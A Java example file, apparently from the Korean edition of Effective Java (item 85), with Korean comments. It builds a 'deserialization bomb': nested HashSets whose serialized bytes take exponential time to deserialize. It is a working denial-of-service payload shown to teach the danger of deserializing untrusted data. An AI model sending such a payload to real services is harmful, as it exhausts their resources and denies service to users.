package effectivejava.chapter12.item85;

import static effectivejava.chapter12.Util.deserialize;
import static effectivejava.chapter12.Util.serialize;

import java.util.HashSet;
import java.util.Set;

// 코드 85-1 역직렬화 폭탄 - 이 스트림의 역직렬화는 영원히 계속된다. (451-452쪽)
public class DeserializationBomb {
	public static void main(String[] args) throws Exception {
		System.out.println(bomb().length);
		// deserialize가 시간이 많이 걸리는데, HashSet 인스턴스를 역직렬화하기 위해
		// O(2^N)
		deserialize(bomb());
	}

	static byte[] bomb() {
		Set<Object> root = new HashSet<>();
		Set<Object> s1 = root;
		Set<Object> s2 = new HashSet<>();
		for (int i = 0; i < 100; i++) {
			Set<Object> child1 = new HashSet<>();
			Set<Object> child2 = new HashSet<>();
			child1.add("foo"); // t1을 t2와 다르게 만든다.
			s1.add(child1);
			s1.add(child2);
			s2.add(child1);
			s2.add(child2);
			s1 = child1;
			s2 = child2;
		}
		return serialize(root); // 이 메서드는 effectivejava.chapter12.Util 클래스에 정의되어 있다.
	}
}
